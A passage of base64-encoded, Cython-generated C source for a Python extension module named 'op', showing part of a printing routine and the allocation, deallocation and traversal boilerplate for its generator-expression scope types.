1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICAgICAgX19weXhfdF8yID0gX19QeXhfTmV3UmVmKFB5VHVwbGVfR0VUX0lURU0oX19weXhfdF81LCBfX3B5eF90XzkpKTtcbiAgICAgICAgI2Vsc2VcbiAgICAgICAgX19weXhfdF8yID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKF9fcHl4X3RfNSwgX19weXhfdF85KTtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgICsrX19weXhfdF85O1xuICAgICAgfVxuICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNDU0LCBfX3B5eF9MMV9lcnJvcilcbiAgICB9IGVsc2Uge1xuICAgICAgX19weXhfdF8yID0gX19weXhfdF8xMChfX3B5eF90XzUpO1xuICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSB7XG4gICAgICAgIFB5T2JqZWN0KiBleGNfdHlwZSA9IFB5RXJyX09jY3VycmVkKCk7XG4gICAgICAgIGlmIChleGNfdHlwZSkge1xuICAgICAgICAgIGlmICh1bmxpa2VseSghX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGV4Y190eXBlLCBQeUV4Y19TdG9wSXRlcmF0aW9uKSkpIF9fUFlYX0VSUigwLCA0NTQsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgICAgIFB5RXJyX0NsZWFyKCk7XG4gICAgICAgIH1cbiAgICAgICAgYnJlYWs7XG4gICAgICB9XG4gICAgfVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X3ZfdCwgX19weXhfdF8yKTtcbiAgICBfX3B5eF90XzIgPSAwO1xuXG4gICAgXG4gICAgX19weXhfdF83ID0gX19weXhfdl90O1xuICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzcpO1xuICAgIF9fcHl4X3RfNiA9IDA7XG4gICAge1xuICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNywgTlVMTH07XG4gICAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfam9pbiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMS1fX3B5eF90XzYpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA0NTUsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gICAgfVxuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuXG4gICAgXG4gIH1cbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG5cbiAgXG5cbiAgXG4gIF9fcHl4X3IgPSBQeV9Ob25lOyBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7XG4gIGdvdG8gX19weXhfTDA7XG4gIF9fcHl4X0wxX2Vycm9yOjtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7XG4gIF9fUHl4X0FkZFRyYWNlYmFjaygib3AucHJpbnRpbmciLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgX19weXhfciA9IE5VTEw7XG4gIF9fcHl4X0wwOjtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3QpO1xuICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfdHBfbmV3XzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIoUHlUeXBlT2JqZWN0ICp0LCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICphLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICprKSB7XG4gIFB5T2JqZWN0ICpvO1xuICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICBhbGxvY2Z1bmMgYWxsb2NfZnVuYyA9IChhbGxvY2Z1bmMpUHlUeXBlX0dldFNsb3QodCwgUHlfdHBfYWxsb2MpO1xuICBvID0gYWxsb2NfZnVuYyh0LCAwKTtcbiAgI2Vsc2VcbiAgI2lmIENZVEhPTl9VU0VfRlJFRUxJU1RTXG4gIGlmIChsaWtlbHkoKGludCkoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIgPiAwKSAmIChpbnQpKHQtPnRwX2Jhc2ljc2l6ZSA9PSBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8yb3BfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByKSkpKSB7XG4gICAgbyA9IChQeU9iamVjdCopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWxpc3RfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwclstLV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8yb3BfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByXTtcbiAgICBtZW1zZXQobywgMCwgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcikpO1xuICAgICh2b2lkKSBQeU9iamVjdF9JTklUKG8sIHQpO1xuICAgIFB5T2JqZWN0X0dDX1RyYWNrKG8pO1xuICB9IGVsc2VcbiAgI2VuZGlmXG4gIHtcbiAgICBvID0gKCp0LT50cF9hbGxvYykodCwgMCk7XG4gICAgaWYgKHVubGlrZWx5KCFvKSkgcmV0dXJuIDA7XG4gIH1cbiAgI2VuZGlmXG4gIHJldHVybiBvO1xufVxuXG5zdGF0aWMgdm9pZCBfX3B5eF90cF9kZWFsbG9jXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIoUHlPYmplY3QgKm8pIHtcbiAgc3RydWN0IF9fcHl4X29ial8yb3BfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByICpwID0gKHN0cnVjdCBfX3B5eF9vYmpfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciAqKW87XG4gICNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG4gIGlmICh1bmxpa2VseSgoUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDAwMCB8fCBfX1B5eF9QeVR5cGVfSGFzRmVhdHVyZShQeV9UWVBFKG8pLCBQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUpKSAmJiBfX1B5eF9QeU9iamVjdF9HZXRTbG90KG8sIHRwX2ZpbmFsaXplLCBkZXN0cnVjdG9yKSkgJiYgIV9fUHl4X1B5T2JqZWN0X0dDX0lzRmluYWxpemVkKG8pKSB7XG4gICAgaWYgKF9fUHl4X1B5T2JqZWN0X0dldFNsb3QobywgdHBfZGVhbGxvYywgZGVzdHJ1Y3RvcikgPT0gX19weXhfdHBfZGVhbGxvY18yb3BfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByKSB7XG4gICAgICBpZiAoUHlPYmplY3RfQ2FsbEZpbmFsaXplckZyb21EZWFsbG9jKG8pKSByZXR1cm47XG4gICAgfVxuICB9XG4gICNlbmRpZlxuICBQeU9iamVjdF9HQ19VblRyYWNrKG8pO1xuICBQeV9DTEVBUihwLT5fX3B5eF9nZW5leHByX2FyZ18wKTtcbiAgUHlfQ0xFQVIocC0+X19weXhfdl9pKTtcbiAgI2lmIENZVEhPTl9VU0VfRlJFRUxJU1RTXG4gIGlmICgoKGludCkoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIgPCA4KSAmIChpbnQpKFB5X1RZUEUobyktPnRwX2Jhc2ljc2l6ZSA9PSBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8yb3BfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByKSkpKSB7XG4gICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWxpc3RfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcltfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcisrXSA9ICgoc3RydWN0IF9fcHl4X29ial8yb3BfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByICopbyk7XG4gIH0gZWxzZVxuICAjZW5kaWZcbiAge1xuICAgICNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbiAgICAoKlB5X1RZUEUobyktPnRwX2ZyZWUpKG8pO1xuICAgICNlbHNlXG4gICAge1xuICAgICAgZnJlZWZ1bmMgdHBfZnJlZSA9IChmcmVlZnVuYylQeVR5cGVfR2V0U2xvdChQeV9UWVBFKG8pLCBQeV90cF9mcmVlKTtcbiAgICAgIGlmICh0cF9mcmVlKSB0cF9mcmVlKG8pO1xuICAgIH1cbiAgICAjZW5kaWZcbiAgfVxufVxuXG5zdGF0aWMgaW50IF9fcHl4X3RwX3RyYXZlcnNlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIoUHlPYmplY3QgKm8sIHZpc2l0cHJvYyB2LCB2b2lkICphKSB7XG4gIGludCBlO1xuICBzdHJ1Y3QgX19weXhfb2JqXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIgKnAgPSAoc3RydWN0IF9fcHl4X29ial8yb3BfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByICopbztcbiAge1xuICAgIGUgPSBfX1B5eF9jYWxsX3R5cGVfdHJhdmVyc2UobywgMSwgdiwgYSk7XG4gICAgaWYgKGUpIHJldHVybiBlO1xuICB9XG4gIGlmIChwLT5fX3B5eF9nZW5leHByX2FyZ18wKSB7XG4gICAgZSA9ICgqdikocC0+X19weXhfZ2VuZXhwcl9hcmdfMCwgYSk7IGlmIChlKSByZXR1cm4gZTtcbiAgfVxuICBpZiAocC0+X19weXhfdl9pKSB7XG4gICAgZSA9ICgqdikocC0+X19weXhfdl9pLCBhKTsgaWYgKGUpIHJldHVybiBlO1xuICB9XG4gIHJldHVybiAwO1xufVxuI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDU1xuc3RhdGljIFB5VHlwZV9TbG90IF9fcHl4X3R5cGVfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcl9zbG90c1tdID0ge1xuICB7UHlfdHBfZGVhbGxvYywgKHZvaWQgKilfX3B5eF90cF9kZWFsbG9jXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHJ9LFxuICB7UHlfdHBfdHJhdmVyc2UsICh2b2lkICopX19weXhfdHBfdHJhdmVyc2VfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcn0sXG4gIHtQeV90cF9uZXcsICh2b2lkICopX19weXhfdHBfbmV3XzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHJ9LFxuICB7MCwgMH0sXG59O1xuc3RhdGljIFB5VHlwZV9TcGVjIF9fcHl4X3R5cGVfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcl9zcGVjID0ge1xuICAib3AuX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByIixcbiAgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciksXG4gIDAsXG4gIFB5X1RQRkxBR1NfREVGQVVMVHxQeV9UUEZMQUdTX0hBVkVfVkVSU0lPTl9UQUd8UHlfVFBGTEFHU19DSEVDS1RZUEVTfFB5X1RQRkxBR1NfSEFWRV9ORVdCVUZGRVJ8UHlfVFBGTEFHU19IQVZFX0dDfFB5X1RQRkxBR1NfSEFWRV9GSU5BTElaRSxcbiAgX19weXhfdHlwZV8yb3BfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByX3Nsb3RzLFxufTtcbiNlbHNlXG5cbnN0YXRpYyBQeVR5cGVPYmplY3QgX19weXhfdHlwZV8yb3BfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByID0ge1xuICBQeVZhck9iamVjdF9IRUFEX0lOSVQoMCwgMClcbiAgIm9wLiIiX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByIiwgXG4gIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIpLCBcbiAgMCwgXG4gIF9fcHl4X3RwX2RlYWxsb2NfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciwgXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwODAwYjRcbiAgMCwgXG4gICNlbmRpZlxuICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDBiNFxuICAwLCBcbiAgI2VuZGlmXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICBQeV9UUEZMQUdTX0RFRkFVTFR8UHlfVFBGTEFHU19IQVZFX1ZFUlNJT05fVEFHfFB5X1RQRkxBR1NfQ0hFQ0tUWVBFU3xQeV9UUEZMQUdTX0hBVkVfTkVXQlVGRkVSfFB5X1RQRkxBR1NfSEFWRV9HQ3xQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUsIFxuICAwLCBcbiAgX19weXhfdHBfdHJhdmVyc2VfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gICNpZiAhQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG4gIDAsIFxuICAjZW5kaWZcbiAgMCwgXG4gIDAsIFxuICBfX3B5eF90cF9uZXdfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gICNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG4gIDAsIFxuICAjZWxzZVxuICBOVUxMLCBcbiAgI2VuZGlmXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMGIxICYmICghQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IFBZUFlfVkVSU0lPTl9OVU0gPj0gMHgwNzAzMDgwMClcbiAgMCwgXG4gICNlbmRpZlxuICAjaWYgX19QWVhfTkVFRF9UUF9QUklOVF9TTE9UID09IDFcbiAgMCwgXG4gICNlbmRpZlxuICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMFxuICAwLCBcbiAgI2VuZGlmXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMEE0XG4gIDAsIFxuICAjZW5kaWZcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBhMDAwMFxuICAwLCBcbiAgI2VuZGlmXG59O1xuI2VuZGlmXG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfdHBfbmV3XzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKFB5VHlwZU9iamVjdCAqdCwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqYSwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqaykge1xuICBQeU9iamVjdCAqbztcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgYWxsb2NmdW5jIGFsbG9jX2Z1bmMgPSAoYWxsb2NmdW5jKVB5VHlwZV9HZXRTbG90KHQsIFB5X3RwX2FsbG9jKTtcbiAgbyA9IGFsbG9jX2Z1bmModCwgMCk7XG4gICNlbHNlXG4gICNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUU1xuICBpZiAobGlrZWx5KChpbnQpKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8yb3BfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciA+IDApICYgKGludCkodC0+dHBfYmFzaWNzaXplID09IHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKSkpKSB7XG4gICAgbyA9IChQeU9iamVjdCopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWxpc3RfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHJbLS1fX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHJdO1xuICAgIG1lbXNldChvLCAwLCBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8yb3BfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcikpO1xuICAgICh2b2lkKSBQeU9iamVjdF9JTklUKG8sIHQpO1xuICAgIFB5T2JqZWN0X0dDX1RyYWNrKG8pO1xuICB9IGVsc2VcbiAgI2VuZGlmXG4gIHtcbiAgICBvID0gKCp0LT50cF9hbGxvYykodCwgMCk7XG4gICAgaWYgKHVubGlrZWx5KCFvKSkgcmV0dXJuIDA7XG4gIH1cbiAgI2VuZGlmXG4gIHJldHVybiBvO1xufVxuXG5zdGF0aWMgdm9pZCBfX3B5eF90cF9kZWFsbG9jXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKFB5T2JqZWN0ICpvKSB7XG4gIHN0cnVjdCBfX3B5eF9vYmpfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgKnAgPSAoc3RydWN0IF9fcHl4X29ial8yb3BfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciAqKW87XG4gICNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG4gIGlmICh1bmxpa2VseSgoUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDAwMCB8fCBfX1B5eF9QeVR5cGVfSGFzRmVhdHVyZShQeV9UWVBFKG8pLCBQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUpKSAmJiBfX1B5eF9QeU9iamVjdF9HZXRTbG90KG8sIHRwX2ZpbmFsaXplLCBkZXN0cnVjdG9yKSkgJiYgIV9fUHl4X1B5T2JqZWN0X0dDX0lzRmluYWxpemVkKG8pKSB7XG4gICAgaWYgKF9fUHl4X1B5T2JqZWN0X0dldFNsb3QobywgdHBfZGVhbGxvYywgZGVzdHJ1Y3RvcikgPT0gX19weXhfdHBfZGVhbGxvY18yb3BfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcikge1xuICAgICAgaWYgKFB5T2JqZWN0X0NhbGxGaW5hbGl6ZXJGcm9tRGVhbGxvYyhvKSkgcmV0dXJuO1xuICAgIH1cbiAgfVxuICAjZW5kaWZcbiAgUHlPYmplY3RfR0NfVW5UcmFjayhvKTtcbiAgUHlfQ0xFQVIocC0+X19weXhfZ2VuZXhwcl9hcmdfMCk7XG4gIFB5X0NMRUFSKHAtPl9fcHl4X3ZfaSk7XG4gICNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUU1xuICBpZiAoKChpbnQpKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8yb3BfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciA8IDgpICYgKGludCkoUHlfVFlQRShvKS0+dHBfYmFzaWNzaXplID09IHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKSkpKSB7XG4gICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWxpc3RfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHJbX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKytdID0gKChzdHJ1Y3QgX19weXhfb2JqXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByICopbyk7XG4gIH0gZWxzZVxuICAjZW5kaWZcbiAge1xuICAgICNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbiAgICAoKlB5X1RZUEUobyktPnRwX2ZyZWUpKG8pO1xuICAgICNlbHNlXG4gICAge1xuICAgICAgZnJlZWZ1bmMgdHBfZnJlZSA9IChmcmVlZnVuYylQeVR5cGVfR2V0U2xvdChQeV9UWVBFKG8pLCBQeV90cF9mcmVlKTtcbiAgICAgIGlmICh0cF9mcmVlKSB0cF9mcmVlKG8pO1xuICAgIH1cbiAgICAjZW5kaWZcbiAgfVxufVxuXG5zdGF0aWMgaW50IF9fcHl4X3RwX3RyYXZlcnNlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKFB5T2JqZWN0ICpvLCB2aXNpdHByb2Mgdiwgdm9pZCAqYSkge1xuICBpbnQgZTtcbiAgc3RydWN0IF9fcHl4X29ial8yb3BfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciAqcCA9IChzdHJ1Y3QgX19weXhfb2JqXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByICopbztcbiAge1xuICAgIGUgPSBfX1B5eF9jYWxsX3R5cGVfdHJhdmVyc2UobywgMSwgdiwgYSk7XG4gICAgaWYgKGUpIHJldHVybiBlO1xuICB9XG4gIGlmIChwLT5fX3B5eF9nZW5leHByX2FyZ18wKSB7XG4gICAgZSA9ICgqdikocC0+X19weXhfZ2VuZXhwcl9hcmdfMCwgYSk7IGlmIChlKSByZXR1cm4gZTtcbiAgfVxuICBpZiAocC0+X19weXhfdl9pKSB7XG4gICAgZSA9ICgqdikocC0+X19weXhfdl9pLCBhKTsgaWYgKGUpIHJldHVybiBlO1xuICB9XG4gIHJldHVybiAwO1xufVxuI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDU1xuc3RhdGljIFB5VHlwZV9TbG90IF9fcHl4X3R5cGVfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHJfc2xvdHNbXSA9IHtcbiAge1B5X3RwX2RlYWxsb2MsICh2b2lkICopX19weXhfdHBfZGVhbGxvY18yb3BfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcn0sXG4gIHtQeV90cF90cmF2ZXJzZSwgKHZvaWQgKilfX3B5eF90cF90cmF2ZXJzZV8yb3BfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcn0sXG4gIHtQeV90cF9uZXcsICh2b2lkICopX19weXhfdHBfbmV3XzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByfSxcbiAgezAsIDB9LFxufTtcbnN0YXRpYyBQeVR5cGVfU3BlYyBfX3B5eF90eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByX3NwZWMgPSB7XG4gICJvcC5fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByIixcbiAgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIpLFxuICAwLFxuICBQeV9UUEZMQUdTX0RFRkFVTFR8UHlfVFBGTEFHU19IQVZFX1ZFUlNJT05fVEFHfFB5X1RQRkxBR1NfQ0hFQ0tUWVBFU3xQeV9UUEZMQUdTX0hBVkVfTkVXQlVGRkVSfFB5X1RQRkxBR1NfSEFWRV9HQ3xQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUsXG4gIF9fcHl4X3R5cGVfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHJfc2xvdHMsXG59O1xuI2Vsc2Vcblxuc3RhdGljIFB5VHlwZU9iamVjdCBfX3B5eF90eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByID0ge1xuICBQeVZhck9iamVjdF9IRUFEX0lOSVQoMCwgMClcbiAgIm9wLiIiX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciIsIFxuICBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8yb3BfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciksIFxuICAwLCBcbiAgX19weXhfdHBfZGVhbGxvY18yb3BfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciwgXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwODAwYjRcbiAgMCwgXG4gICNlbmRpZlxuICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDBiNFxuICAwLCBcbiAgI2VuZGlmXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICBQeV9UUEZMQUdTX0RFRkFVTFR8UHlfVFBGTEFHU19IQVZFX1ZFUlNJT05fVEFHfFB5X1RQRkxBR1NfQ0hFQ0tUWVBFU3xQeV9UUEZMQUdTX0hBVkVfTkVXQlVGRkVSfFB5X1RQRkxBR1NfSEFWRV9HQ3xQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUsIFxuICAwLCBcbiAgX19weXhfdHBfdHJhdmVyc2VfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAjaWYgIUNZVEhPTl9VU0VfVFlQRV9TUEVDU1xuICAwLCBcbiAgI2VuZGlmXG4gIDAsIFxuICAwLCBcbiAgX19weXhfdHBfbmV3XzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgI2lmIENZVEhPTl9VU0VfVFBfRklOQUxJWkVcbiAgMCwgXG4gICNlbHNlXG4gIE5VTEwsIFxuICAjZW5kaWZcbiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwYjEgJiYgKCFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgfHwgUFlQWV9WRVJTSU9OX05VTSA+PSAweDA3MDMwODAwKVxuICAwLCBcbiAgI2VuZGlmXG4gICNpZiBfX1BZWF9ORUVEX1RQX1BSSU5UX1NMT1QgPT0gMVxuICAwLCBcbiAgI2VuZGlmXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwXG4gIDAsIFxuICAjZW5kaWZcbiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwQTRcbiAgMCwgXG4gICNlbmRpZlxuICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDAgJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMGEwMDAwXG4gIDAsIFxuICAjZW5kaWZcbn07XG4jZW5kaWZcblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF90cF9uZXdfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIoUHlUeXBlT2JqZWN0ICp0LCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICphLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICprKSB7XG4gIFB5T2JqZWN0ICpvO1xuICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICBhbGxvY2Z1bmMgYWxsb2NfZnVuYyA9IChhbGxvY2Z1bmMpUHlUeXBlX0dldF